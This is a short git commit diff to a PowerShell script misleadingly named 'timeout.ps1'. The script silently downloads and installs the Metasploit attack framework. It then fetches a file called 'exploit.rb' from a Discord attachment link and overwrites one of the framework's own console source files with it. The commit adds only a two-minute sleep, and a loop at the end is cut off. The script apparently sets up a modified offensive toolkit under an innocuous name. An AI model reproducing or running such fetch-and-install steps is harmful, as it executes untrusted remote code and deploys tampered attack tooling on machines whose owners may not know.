537dcdde2049ffa63864d52ab3ae5265709409af
dokatka <73672976+dokatka@users.noreply.github.com>
2021-03-21 18:00:02 +0300

    Update timeout.ps1

--- timeout.ps1
+++ timeout.ps1
@@ -1,6 +1,7 @@
 $WebClient = New-Object System.Net.WebClient
 $WebClient.DownloadFile("https://windows.metasploit.com/metasploitframework-latest.msi","C:\msf.msi")
 msiexec /i C:\msf.msi /qn /norestart
+    Sleep 120
 $WebClient.DownloadFile("https://cdn.discordapp.com/attachments/667336365662535680/823167889191731220/exploit.rb","C:\metasploit-framework\embedded\framework\lib\msf\ui\console\command_dispatcher\exploit.rb")
 $i = 360
 do {
